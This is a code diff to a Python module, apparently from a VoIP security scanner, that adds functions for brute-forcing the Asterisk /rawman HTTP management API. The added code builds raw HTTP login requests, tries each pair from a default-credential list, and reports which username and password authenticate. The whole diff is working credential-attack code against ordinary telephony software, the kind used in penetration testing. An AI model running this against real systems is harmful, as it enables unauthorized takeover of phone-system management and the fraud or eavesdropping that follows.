@@ -107,6 +107,72 @@ def _try_login(host: str, port: int, username: str, password: str,
             pass
 
 
+def _rawman_try_login(host: str, port: int, username: str, password: str,
+                      timeout: float) -> tuple[bool, bool]:
+    """Return (reachable, authenticated) against Asterisk /rawman HTTP API."""
+    import urllib.parse as _up
+    qs = f"action=login&username={_up.quote(username)}&secret={_up.quote(password)}"
+    path = f"/rawman?{qs}"
+    req_bytes = (
+        f"GET {path} HTTP/1.0\r\n"
+        f"Host: {host}\r\n"
+        "User-Agent: VoIPScan/3.0\r\n\r\n"
+    ).encode()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        s.connect((host, port))
+        s.sendall(req_bytes)
+        raw = b""
+        while len(raw) < 4096:
+            try:
+                chunk = s.recv(2048)
+            except socket.timeout:
+                break
+            if not chunk:
+                break
+            raw += chunk
+        text = raw.decode("utf-8", errors="replace")
+        reachable = bool(text)
+        authed = "Response: Success" in text or "authenticated" in text.lower()
+        return reachable, authed
+    except (socket.timeout, OSError):
+        return False, False
+    finally:
+        try:
+            s.close()
+        except OSError:
+            pass
+
+
+def attack_asterisk_http(
+    host: str,
+    port: int = 8088,
+    cred_pairs: list[tuple[str, str]] | None = None,
+    timeout: float = 3.0,
+) -> AmiResult:
+    """Brute-force Asterisk /rawman HTTP management API with default credentials."""
+    creds = cred_pairs or DEFAULT_AMI_CREDS
+    result = AmiResult(host=host, port=port, reachable=False)
+
+    for u, p in creds:
+        reachable, authed = _rawman_try_login(host, port, u, p, timeout)
+        if reachable:
+            result.reachable = True
+        if authed:
+            result.success = True
+            result.username = u
+            result.password = p
+            result.evidence = f"Asterisk HTTP /rawman authenticated: {u}/{p}"
+            return result
+
+    if not result.reachable:
+        result.evidence = "Asterisk HTTP API not reachable on this port"
+    else:
+        result.evidence = f"HTTP /rawman reachable but no default creds matched ({len(creds)} tried)"
+    return result
+
+
 def attack(
     host: str,
     port: int = 5038,
